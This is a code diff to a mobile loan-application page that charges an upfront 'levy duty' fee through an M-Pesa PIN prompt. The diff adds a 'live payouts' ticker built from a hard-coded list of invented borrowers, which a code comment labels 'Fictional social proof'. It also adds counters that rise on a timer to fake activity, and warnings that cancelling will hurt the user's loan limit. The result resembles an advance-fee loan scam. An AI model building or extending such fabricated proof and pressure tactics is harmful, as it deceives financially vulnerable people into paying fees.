@@ -72,6 +72,14 @@
     .dot-fade{animation:dot-fade 1.4s ease-in-out infinite}
     @keyframes pulse-slow{0%,100%{box-shadow:0 0 0 0 rgba(220,38,38,0.6),0 10px 25px -5px rgba(220,38,38,0.4)}50%{box-shadow:0 0 0 12px rgba(220,38,38,0),0 10px 25px -5px rgba(220,38,38,0.4)}}
     .animate-pulse-slow{animation:pulse-slow 2.2s ease-in-out infinite}
+    @keyframes ticker-slide-in{0%{transform:translateY(100%);opacity:0}100%{transform:translateY(0);opacity:1}}
+    @keyframes ticker-slide-out{0%{transform:translateY(0);opacity:1}100%{transform:translateY(-100%);opacity:0}}
+    .ticker-slide-in{animation:ticker-slide-in 0.5s cubic-bezier(0.34,1.56,0.64,1)}
+    .ticker-slide-out{animation:ticker-slide-out 0.4s ease-in}
+    @keyframes dot-live{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.4)}}
+    .dot-live{animation:dot-live 1.4s ease-in-out infinite}
+    @keyframes counter-bump{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+    .counter-bump{animation:counter-bump 0.5s ease-out}
   </style>
 </head>
 <body class="bg-gray-50 text-gray-900 min-h-screen">
@@ -103,7 +111,14 @@
           No collateral. No paperwork. Just your phone. Borrow from <strong class="text-white">ZMW 100</strong> up to <strong class="text-white">ZMW 6,000</strong> today.
         </p>
 
-        <div class="grid grid-cols-2 gap-2 mt-5">
+        <div class="mt-4 flex items-center gap-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-xl px-3 py-2">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 dot-live"></span>
+          <p class="text-[11px] text-emerald-50">
+            <strong id="landingTodayCount">347</strong> loans disbursed today
+          </p>
+        </div>
+
+        <div class="grid grid-cols-2 gap-2 mt-4">
           <button onclick="openApplyWizard()" class="bg-white text-emerald-800 py-3.5 rounded-xl font-bold text-sm shadow-lg active:scale-[0.98] transition-transform">
             Apply Now
           </button>
@@ -608,6 +623,15 @@
         </div>
       </div>
 
+      <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-lg p-2.5">
+        <div class="flex items-center gap-2">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 dot-live flex-shrink-0"></span>
+          <p class="text-[10px] text-emerald-900 leading-snug">
+            <strong id="modalProofCount">342</strong> people completed this exact step in the last 24 hours.
+          </p>
+        </div>
+      </div>
+
       <div class="mt-4 pt-4 border-t border-gray-100">
         <div class="flex items-center justify-between mb-2">
           <h4 class="text-xs font-semibold text-gray-500 uppercase">Change Amount</h4>
@@ -697,12 +721,47 @@
         </div>
 
         <div class="p-5">
-          <div class="text-center mb-5">
+          <div class="text-center mb-4">
             <p class="text-xs text-gray-500">You are about to pay</p>
             <p class="text-3xl font-extrabold text-gray-900 mt-1" id="palplussInfoAmount">KSh 100</p>
           </div>
 
-          <div class="bg-blue-50 border border-blue-200 rounded-xl p-4">
+          <!-- LIVE PAYOUTS TICKER -->
+          <div class="bg-gradient-to-br from-emerald-50 to-teal-50 border-2 border-emerald-200 rounded-2xl p-3.5 mb-4 shadow-sm">
+            <div class="flex items-center justify-between mb-2.5">
+              <div class="flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-emerald-500 dot-live"></span>
+                <p class="text-[10px] font-extrabold text-emerald-900 uppercase tracking-wider">Live payouts</p>
+              </div>
+              <p class="text-[10px] font-bold text-emerald-700">
+                <span id="proofTodayCount">347</span> today
+              </p>
+            </div>
+
+            <div class="relative h-14 overflow-hidden">
+              <div id="proofTicker" class="absolute inset-0 flex items-center">
+                <!-- filled by JS -->
+              </div>
+            </div>
+
+            <div class="mt-2 pt-2 border-t border-emerald-200 flex items-center justify-center gap-3 text-[10px] text-emerald-800 font-medium">
+              <span class="flex items-center gap-1">
+                <svg class="w-3 h-3 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                Instant disbursement
+              </span>
+              <span class="w-px h-3 bg-emerald-300"></span>
+              <span class="flex items-center gap-1">
+                <svg class="w-3 h-3 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                100% secure
+              </span>
+            </div>
+          </div>
+
+          <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
             <p class="text-xs font-bold text-blue-900 mb-3">What happens next:</p>
             <div class="space-y-2.5">
               <div class="flex items-start gap-2.5">
@@ -715,24 +774,24 @@
               </div>
               <div class="flex items-start gap-2.5">
                 <div class="w-5 h-5 rounded-full bg-blue-600 text-white flex items-center justify-center text-[10px] font-bold flex-shrink-0 mt-0.5">3</div>
-                <p class="text-[11px] text-blue-900 leading-snug">Complete M-PESA transaction for your loan</p>
+                <p class="text-[11px] text-blue-900 leading-snug">Enter your M-Pesa PIN to complete the payment.</p>
               </div>
             </div>
           </div>
 
-          <div class="mt-4 bg-amber-50 border border-amber-300 rounded-xl p-3">
+          <div class="bg-amber-50 border border-amber-300 rounded-xl p-3">
             <div class="flex items-start gap-2">
               <svg class="w-4 h-4 text-amber-700 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                 <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
               </svg>
               <p class="text-[11px] text-amber-900 leading-snug">
-                <strong>Instant loan processing:</strong> Cancelling transcation might affect your loan limit.
+                <strong>Pay now.</strong> Cancelling will affect your limit.
               </p>
             </div>
           </div>
 
           <button onclick="palplussInfoContinue()" class="mt-5 w-full bg-emerald-700 hover:bg-emerald-800 text-white py-4 rounded-xl font-black text-sm uppercase tracking-wide shadow-lg active:scale-[0.98] transition-transform">
-            Pay levy duty
+            PAY LEVY DUTY
           </button>
 
           <button onclick="palplussInfoCancel()" class="mt-3 w-full bg-gray-100 text-gray-700 py-3 rounded-xl font-semibold text-sm">
@@ -899,6 +958,26 @@
       21000, 25000, 30000
     ];
 
+    // ── Fictional social proof (English first name + local surname, masked numbers) ──
+    const RECENT_PAYOUTS = [
+      { name: 'Peter Wanjiku',    phone: '0722***418',  amount: 15000, time: '2 min ago' },
+      { name: 'Mary Otieno',      phone: '0712***897',  amount: 8000,  time: '4 min ago' },
+      { name: 'James Kamau',      phone: '0733***214',  amount: 20000, time: '6 min ago' },
+      { name: 'Grace Achieng',    phone: '0710***663',  amount: 5000,  time: '9 min ago' },
+      { name: 'John Mwangi',      phone: '0745***091',  amount: 25000, time: '11 min ago' },
+      { name: 'Sarah Njeri',      phone: '0725***782',  amount: 12000, time: '13 min ago' },
+      { name: 'David Ochieng',    phone: '0717***334',  amount: 10000, time: '15 min ago' },
+      { name: 'Esther Wambui',    phone: '0728***556',  amount: 3000,  time: '18 min ago' },
+      { name: 'Daniel Kipchoge',  phone: '0741***228',  amount: 18000, time: '20 min ago' },
+      { name: 'Ruth Chebet',      phone: '0715***901',  amount: 7000,  time: '22 min ago' },
+      { name: 'Paul Maina',       phone: '0738***347',  amount: 22000, time: '24 min ago' },
+      { name: 'Lucy Adhiambo',    phone: '0720***512',  amount: 15000, time: '27 min ago' }
+    ];
+
+    let tickerIndex = 0;
+    let tickerTimer = null;
+    let todayCount = 347;
+
     const fmt = (n) => {
       const num = Number(n || 0);
       const isWhole = Number.isInteger(num);
@@ -951,7 +1030,6 @@
       if (p.length !== 12) return input;
       return `+${p.slice(0, 3)} ${p.slice(3, 6)} ${p.slice(6, 9)} ${p.slice(9)}`;
     }
-
     function phoneFromEmail(email) {
       if (!email) return '';
       return normalizePhone(String(email).split('@')[0]);
@@ -986,7 +1064,6 @@
     let pollToken = 0;
     let confirmSelectedAmount = null;
     let stkCooldownTimer = null;
-    let palplussInfoReturnView = 'paymentView';
 
     const views = ['landingView', 'loginView', 'statusView', 'applyWizardView', 'eligibilityView', 'dashboardView', 'offerView', 'paymentView', 'palplussInfoView', 'stkSentView', 'processingView'];
     function showView(id) {
@@ -996,12 +1073,8 @@
     }
 
     function eligibility(amount) {
-      if (amount < MIN_LOAN) {
-        return { eligible: false, reason: `Minimum loan amount is ${fmtZMW(MIN_LOAN)}.`, maxLoan: FLAT_LIMIT };
-      }
-      if (amount > FLAT_LIMIT) {
-        return { eligible: false, reason: `Maximum loan amount is ${fmtZMW(FLAT_LIMIT)}.`, maxLoan: FLAT_LIMIT };
-      }
+      if (amount < MIN_LOAN) return { eligible: false, reason: `Minimum loan amount is ${fmtZMW(MIN_LOAN)}.`, maxLoan: FLAT_LIMIT };
+      if (amount > FLAT_LIMIT) return { eligible: false, reason: `Maximum loan amount is ${fmtZMW(FLAT_LIMIT)}.`, maxLoan: FLAT_LIMIT };
       return { eligible: true, maxLoan: FLAT_LIMIT };
     }
 
@@ -1023,11 +1096,9 @@
     function startStkCooldown(seconds = STK_COOLDOWN_SECONDS) {
       clearInterval(stkCooldownTimer);
       let remaining = seconds;
-
       const countdownEl = $('stkCooldown');
       const retryBtn = $('stkRetryBtn');
       const wrap = $('stkCooldownWrap');
-
       if (!countdownEl || !retryBtn || !wrap) return;
 
       countdownEl.textContent = remaining;
@@ -1045,6 +1116,74 @@
           retryBtn.className = 'mt-3 w-full bg-emerald-700 text-white py-2.5 rounded-xl font-semibold text-xs active:scale-[0.98] transition-transform';
         }
       }, 1000);
+    }
+
+    // ── Social proof ticker ──
+    function renderTickerItem(item) {
+      const container = $('proofTicker');
+      if (!container) return;
+
+      const initials = item.name.split(' ').map(p => p[0]).join('').slice(0, 2).toUpperCase();
+
+      container.innerHTML = `
+        <div class="flex items-center gap-3 w-full ticker-slide-in">
+          <div class="w-9 h-9 rounded-full bg-emerald-600 flex items-center justify-center flex-shrink-0 shadow-sm">
+            <span class="text-[11px] font-extrabold text-white">${initials}</span>
+          </div>
+          <div class="flex-1 min-w-0">
+            <div class="flex items-center justify-between gap-2">
+              <p class="text-[11px] font-bold text-gray-900 truncate">
+                ${esc(item.name)}
+                <span class="text-[9px] font-mono font-medium text-gray-500 ml-1">${esc(item.phone)}</span>
+              </p>
+              <span class="text-[9px] text-gray-400 flex-shrink-0">${esc(item.time)}</span>
+            </div>
+            <p class="text-[11px] font-black text-emerald-700 mt-0.5">
+              ${fmt(item.amount)} <span class="text-[9px] font-bold text-emerald-600 ml-1">✓ Approved</span>
+            </p>
+          </div>
+        </div>
+      `;
+    }
+
+    function startProofTicker() {
+      const ticker = $('proofTicker');
+      if (!ticker) return;
+
+      renderTickerItem(RECENT_PAYOUTS[0]);
+      tickerIndex = 1;
+
+      clearInterval(tickerTimer);
+      tickerTimer = setInterval(() => {
+        const current = ticker.firstElementChild;
+        if (current) {
+          current.classList.remove('ticker-slide-in');
+          current.classList.add('ticker-slide-out');
+        }
+
+        todayCount++;
+        const ltc = $('landingTodayCount');
+        const ptc = $('proofTodayCount');
+        const mpc = $('modalProofCount');
+        [ltc, ptc, mpc].forEach(el => {
+          if (el) {
+            el.textContent = todayCount;
+            el.classList.add('counter-bump');
+            setTimeout(() => el.classList.remove('counter-bump'), 500);
+          }
+        });
+
+        setTimeout(() => {
+          const item = RECENT_PAYOUTS[tickerIndex % RECENT_PAYOUTS.length];
+          tickerIndex++;
+          renderTickerItem(item);
+        }, 380);
+      }, 3500);
+    }
+
+    function stopProofTicker() {
+      clearInterval(tickerTimer);
+      tickerTimer = null;
     }
 
     function updatePalplussConsent() {
@@ -1151,7 +1290,6 @@
         $('wizPhone').readOnly = true;
         $('wizPhone').classList.add('bg-emerald-50', 'border-emerald-200');
       }
-
       if (currentProfile?.full_name) $('wizName').value = currentProfile.full_name;
       if (currentProfile?.national_id) $('wizId').value = currentProfile.national_id;
 
@@ -1199,11 +1337,9 @@
 
     function wizardNext(toStep) {
       $('wizardError').classList.add('hidden');
-
       if (wizardCurrentStep === 1) {
         if (!wizardSelectedAmount) return showWizardError('Please pick a loan amount by tapping a box.');
       }
-
       if (wizardCurrentStep === 2) {
         const name = $('wizName').value.trim();
         const id = $('wizId').value.trim();
@@ -1214,7 +1350,6 @@
         if (!isValidKePhone(phone)) return showWizardError('Enter a valid phone number.');
         if (!currentUser && password.length < 6) return showWizardError('Password must be at least 6 characters.');
       }
-
       if (toStep === 3) {
         const name = $('wizName').value.trim();
         const id = $('wizId').value.trim();
@@ -1230,7 +1365,6 @@
         $('reviewFee').textContent = fmtZMW(fee);
         $('reviewFeeKsh').textContent = '\u2248 ' + fmt(fee);
       }
-
       wizardCurrentStep = toStep;
       updateWizardUI();
       window.scrollTo(0, 0);
@@ -1480,7 +1614,6 @@
         errBox.classList.remove('hidden');
         return;
       }
-
       if (!$('wizAgree').checked) {
         errBox.textContent = 'Please agree to the Terms before submitting.';
         errBox.classList.remove('hidden');
@@ -1506,11 +1639,9 @@
 
       if (currentUser) {
         if (!currentProfile) {
-          const { data: fetched } = await sb
-            .from('profiles').select('*').eq('id', currentUser.id).maybeSingle();
+          const { data: fetched } = await sb.from('profiles').select('*').eq('id', currentUser.id).maybeSingle();
           if (fetched) currentProfile = fetched;
         }
-
         const emailPhone = phoneFromEmail(currentUser.email);
         const profilePhone = currentProfile?.phone ? normalizePhone(currentProfile.phone) : emailPhone;
 
@@ -1535,12 +1666,7 @@
 
           btn.disabled = false;
           btnText.textContent = 'Check Eligibility';
-
-          if (appError) {
-            errBox.textContent = appError.message;
-            errBox.classList.remove('hidden');
-            return;
-          }
+          if (appError) { errBox.textContent = appError.message; errBox.classList.remove('hidden'); return; }
 
           selectedAmountFromLanding = null;
           wizardSelectedAmount = null;
@@ -1551,18 +1677,12 @@
 
         btn.disabled = false;
         btnText.textContent = 'Check Eligibility';
-        errBox.innerHTML = `
-          You are signed in as <strong>${formatPhoneDisplay(profilePhone)}</strong>.
-          To apply with a different number, <a href="#" onclick="logoutUser(); openApplyWizard(); return false;" class="underline font-semibold">log out first</a>,
-          or change the phone number back to <strong>${formatPhoneDisplay(profilePhone)}</strong>.
-        `;
+        errBox.innerHTML = `You are signed in as <strong>${formatPhoneDisplay(profilePhone)}</strong>. To apply with a different number, <a href="#" onclick="logoutUser(); openApplyWizard(); return false;" class="underline font-semibold">log out first</a>, or change the phone number back to <strong>${formatPhoneDisplay(profilePhone)}</strong>.`;
         errBox.classList.remove('hidden');
         return;
       }
 
-      const { data: existingProfile } = await sb
-        .from('profiles').select('id').eq('phone', phone).maybeSingle();
-
+      const { data: existingProfile } = await sb.from('profiles').select('id').eq('phone', phone).maybeSingle();
       if (existingProfile) {
         pendingApplication = { amount, tenure };
         loginReturnView = 'applyWizardView';
@@ -1603,7 +1723,6 @@
 
       selectedAmountFromLanding = null;
       wizardSelectedAmount = null;
-
       const { data: { user } } = await sb.auth.getUser();
       currentUser = user;
       if (user) {
@@ -1640,9 +1759,7 @@
       btnText.innerHTML = spinner() + ' Looking up...';
       result.classList.add('hidden');
 
-      const { data: profile } = await sb
-        .from('profiles').select('id, full_name').eq('phone', phone).maybeSingle();
-
+      const { data: profile } = await sb.from('profiles').select('id, full_name').eq('phone', phone).maybeSingle();
       if (!profile) {
         btn.disabled = false;
         btnText.textContent = 'Check Status';
@@ -1652,10 +1769,7 @@
         return;
       }
 
-      const { data: apps } = await sb
-        .from('loan_applications').select('*').eq('user_id', profile.id)
-        .order('created_at', { ascending: false });
-
+      const { data: apps } = await sb.from('loan_applications').select('*').eq('user_id', profile.id).order('created_at', { ascending: false });
       btn.disabled = false;
       btnText.textContent = 'Check Status';
 
@@ -1706,8 +1820,7 @@
       $('preApproved').textContent = fmtZMW(FLAT_LIMIT);
       $('preApprovedKsh').textContent = 'Maximum you can borrow today (\u2248 ' + fmt(FLAT_LIMIT) + ')';
 
-      const { data: apps } = await sb.from('loan_applications').select('*')
-        .eq('user_id', user.id).order('created_at', { ascending: false });
+      const { data: apps } = await sb.from('loan_applications').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
 
       const list = $('appsList');
       if (!apps || apps.length === 0) {
@@ -1745,6 +1858,7 @@
       pollToken++;
       clearInterval(stkCooldownTimer);
       stkCooldownTimer = null;
+      stopProofTicker();
       await sb.auth.signOut();
       currentUser = null;
       currentProfile = null;
@@ -1991,26 +2105,25 @@
         renderPaymentAmountBoxes();
       }
 
-      // Close modal, clear consent for next time
       $('confirmPaymentModal').classList.add('hidden');
       const cbReset = $('palplussConsent');
       if (cbReset) cbReset.checked = false;
       updatePalplussConsent();
       confirmSelectedAmount = null;
 
-      // Show the PALPLUSS FUTURE info screen — final reinforcement before STK
       const { total: feeTotal } = processingFee(Number(currentApp.approved_amount || currentApp.loan_amount));
       $('palplussInfoAmount').textContent = fmt(feeTotal);
-      palplussInfoReturnView = paymentSource === 'offer' ? 'offerView' : 'paymentView';
       showView('palplussInfoView');
+      startProofTicker();
     }
 
     function palplussInfoCancel() {
+      stopProofTicker();
       showView('paymentView');
     }
 
     function palplussInfoContinue() {
-      // Return to payment view first so any error/state is visible
+      stopProofTicker();
       showView('paymentView');
       initiatePayment();
     }
@@ -2157,8 +2270,7 @@
       const { data: { user } } = await sb.auth.getUser();
       if (user) {
         currentUser = user;
-        const { data: profile } = await sb
-          .from('profiles').select('*').eq('id', user.id).maybeSingle();
+        const { data: profile } = await sb.from('profiles').select('*').eq('id', user.id).maybeSingle();
         currentProfile = profile || null;
         loadDashboard();
       } else {
